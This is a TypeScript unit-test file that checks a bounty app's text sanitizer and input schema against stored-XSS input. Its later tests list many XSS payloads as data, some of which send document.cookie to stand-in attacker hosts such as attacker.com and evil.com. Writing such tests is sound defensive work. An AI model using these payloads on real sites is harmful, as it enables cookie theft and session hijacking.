/**
 * sanitize.test.ts
 *
 * Unit tests for the sanitizeText helper and the Zod createBountySchema.
 * Run with:  npx vitest run  (from backend/)
 */

import { describe, expect, it } from "vitest";
import { sanitizeText } from "./sanitize";
import { createBountySchema } from "./schemas";

// ---------------------------------------------------------------------------
// sanitizeText
// ---------------------------------------------------------------------------

describe("sanitizeText", () => {
  it("trims leading and trailing whitespace", () => {
    expect(sanitizeText("  hello  ")).toBe("hello");
    expect(sanitizeText("\t Fix bug \n")).toBe("Fix bug");
  });

  it("encodes < and > (HTML tags)", () => {
    expect(sanitizeText("<script>alert(1)</script>")).toBe(
      "&lt;script&gt;alert(1)&lt;/script&gt;"
    );
  });

  it("encodes & (ampersand)", () => {
    expect(sanitizeText("Rocks & Rolls")).toBe("Rocks &amp; Rolls");
  });

  it("encodes double quotes", () => {
    expect(sanitizeText('He said "hello"')).toBe("He said &quot;hello&quot;");
  });

  it("encodes single quotes", () => {
    expect(sanitizeText("It's fine")).toBe("It&#x27;s fine");
  });

  it("encodes a full XSS payload", () => {
    const payload = `<img src=x onerror="alert('xss')">`;
    const encoded = sanitizeText(payload);
    expect(encoded).toBe(
      "&lt;img src=x onerror=&quot;alert(&#x27;xss&#x27;)&quot;&gt;"
    );
    // Must not contain any raw < or >
    expect(encoded).not.toContain("<");
    expect(encoded).not.toContain(">");
  });

  it("leaves plain text unchanged (apart from trim)", () => {
    expect(sanitizeText("Fix the login bug")).toBe("Fix the login bug");
  });

  it("handles an empty string after trimming", () => {
    // trim only — empty string passes through (schema enforces min length)
    expect(sanitizeText("   ")).toBe("");
  });
});

// ---------------------------------------------------------------------------
// createBountySchema — title and summary sanitization via Zod transform
// ---------------------------------------------------------------------------

describe("createBountySchema – title sanitization", () => {
  const base = {
    issueUrl: "https://github.com/owner/repo/issues/1",
    reward: "100",
  };

  it("trims whitespace from title", () => {
    const result = createBountySchema.parse({
      ...base,
      title: "  Fix login bug  ",
      summary: "Details here",
    });
    expect(result.title).toBe("Fix login bug");
  });

  it("HTML-encodes <script> in title before storage", () => {
    const result = createBountySchema.parse({
      ...base,
      title: "<script>alert(1)</script>",
      summary: "Normal summary",
    });
    expect(result.title).toBe("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(result.title).not.toContain("<");
  });

  it("rejects an empty title", () => {
    expect(() =>
      createBountySchema.parse({ ...base, title: "", summary: "ok" })
    ).toThrow();
  });

  it("rejects a title longer than 200 characters", () => {
    expect(() =>
      createBountySchema.parse({
        ...base,
        title: "a".repeat(201),
        summary: "ok",
      })
    ).toThrow();
  });
});

describe("createBountySchema – summary sanitization", () => {
  const base = {
    issueUrl: "https://github.com/owner/repo/issues/2",
    title: "Normal title",
    reward: "50",
  };

  it("trims whitespace from summary", () => {
    const result = createBountySchema.parse({
      ...base,
      summary: "   Fix the thing.   ",
    });
    expect(result.summary).toBe("Fix the thing.");
  });

  it("HTML-encodes <img onerror> payload in summary before storage", () => {
    const result = createBountySchema.parse({
      ...base,
      summary: `<img src=x onerror="alert('xss')">`,
    });
    expect(result.summary).not.toContain("<");
    expect(result.summary).not.toContain(">");
    expect(result.summary).toContain("&lt;img");
  });

  it("encodes & in summary", () => {
    const result = createBountySchema.parse({
      ...base,
      summary: "Fast & reliable",
    });
    expect(result.summary).toBe("Fast &amp; reliable");
  });

  it("rejects an empty summary", () => {
    expect(() =>
      createBountySchema.parse({ ...base, summary: "" })
    ).toThrow();
  });

  it("rejects a summary longer than 2000 characters", () => {
    expect(() =>
      createBountySchema.parse({ ...base, summary: "x".repeat(2001) })
    ).toThrow();
  });
});

describe("createBountySchema – other fields unaffected", () => {
  it("rejects an invalid issueUrl", () => {
    expect(() =>
      createBountySchema.parse({
        issueUrl: "not-a-url",
        title: "ok",
        summary: "ok",
        reward: "10",
      })
    ).toThrow();
  });

  it("rejects a non-numeric reward", () => {
    expect(() =>
      createBountySchema.parse({
        issueUrl: "https://github.com/o/r/issues/1",
        title: "ok",
        summary: "ok",
        reward: "abc",
      })
    ).toThrow();
  });

  it("accepts a valid complete payload", () => {
    const result = createBountySchema.parse({
      issueUrl: "https://github.com/o/r/issues/3",
      title: "Patch XSS",
      summary: "Encode user input before storage",
      reward: "75",
      urgency: "high",
    });
    expect(result.urgency).toBe("high");
    expect(result.reward).toBe("75");
  });
});

// ---------------------------------------------------------------------------
// Bounty notes field – stored-XSS input sanitization tests
// ---------------------------------------------------------------------------

describe("bounty notes – stored-XSS sanitization", () => {
  it("strips/neutralizes <script> tag payloads in notes before storage", () => {
    const payloads = [
      "<script>alert('xss')</script>",
      '<script src="https://evil.com/payload.js"></script>',
      '<script type="text/javascript">document.location="http://attacker.com/steal?cookie="+document.cookie;</script>',
      "<SCRIPT>alert(1)</SCRIPT>",
    ];

    for (const payload of payloads) {
      const sanitized = sanitizeText(payload);
      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
      expect(sanitized).toContain("&lt;");
      expect(sanitized).toContain("&gt;");
    }
  });

  it("neutralizes inline event handler payloads (onerror, onload, onclick)", () => {
    const payloads = [
      `<img src=x onerror="alert('xss')">`,
      `<svg onload=alert(document.domain)>`,
      `<body onload=alert('xss')>`,
      `<a href="#" onclick="fetch('http://attacker.com?c='+document.cookie)">Click me</a>`,
      `<input type="text" autofocus onfocus="alert(1)">`,
    ];

    for (const payload of payloads) {
      const sanitized = sanitizeText(payload);
      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
      expect(sanitized).not.toContain('"');
      expect(sanitized).not.toContain("'");
    }
  });

  it("neutralizes javascript: URIs and dangerous tag combinations", () => {
    const payloads = [
      `<a href="javascript:alert('XSS')">Claim bounty</a>`,
      `<iframe src="javascript:alert(1)"></iframe>`,
      `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`,
    ];

    for (const payload of payloads) {
      const sanitized = sanitizeText(payload);
      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
    }
  });

  it("neutralizes nested and malformed HTML tag injection attempts", () => {
    const payloads = [
      `<<SCRIPT>alert("XSS");//<</SCRIPT>`,
      `<scr<script>ipt>alert(1)</scr</script>ipt>`,
      `"><script>alert('xss')</script>`,
      `" onmouseover="alert('xss')" style="position:absolute;top:0;left:0;width:100%;height:100%"`,
    ];

    for (const payload of payloads) {
      const sanitized = sanitizeText(payload);
      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
      expect(sanitized).not.toContain('"');
    }
  });

  it("ensures a round-trip read of sanitized notes renders safely as inert entity text", () => {
    const rawNote = `Submission complete! Please check <script>alert('xss')</script> and <img src=x onerror="alert(1)">.`;
    const storedNote = sanitizeText(rawNote);

    // Assert that the stored string has no executable tag wrappers
    expect(storedNote).toBe(
      "Submission complete! Please check &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; and &lt;img src=x onerror=&quot;alert(1)&quot;&gt;."
    );

    // Verify stored note contains only inert escaped entities
    expect(storedNote).not.toMatch(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi);
    expect(storedNote).not.toMatch(/<[a-z][\s\S]*>/i);
  });

  it("preserves legitimate markdown and plain-text notes without over-sanitization", () => {
    const legitimateNotes = [
      "Completed implementation of Soroban smart contract interaction.",
      "Fixed issue #42 by adjusting the auth middleware.",
      "# Summary of Changes\n- Implemented `verifySignature`\n- Added unit tests\n- Documentation updated",
      "Repository reference: https://github.com/stellar/stellar-core",
      "Benchmark: 1000 ops/sec (50% speedup).",
    ];

    for (const note of legitimateNotes) {
      const sanitized = sanitizeText(note);
      // Plain text and markdown structure without HTML entities should match trimmed input
      expect(sanitized).toBe(note.trim());
      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
    }
  });

  it("handles regression payload variants (mixed casing, attributes, and multi-line markup)", () => {
    const regressionPayload = `
      <sCrIpt TYPE="text/javascript">
        /* Stored XSS regression test */
        window.location = 'https://attacker.site/leak?data=' + encodeURIComponent(document.cookie);
      </sCrIpt>
    `;

    const sanitized = sanitizeText(regressionPayload);
    expect(sanitized).not.toContain("<");
    expect(sanitized).not.toContain(">");
    expect(sanitized).not.toContain("'");
    expect(sanitized).toContain("&lt;sCrIpt");
    expect(sanitized).toContain("&lt;/sCrIpt&gt;");
  });
});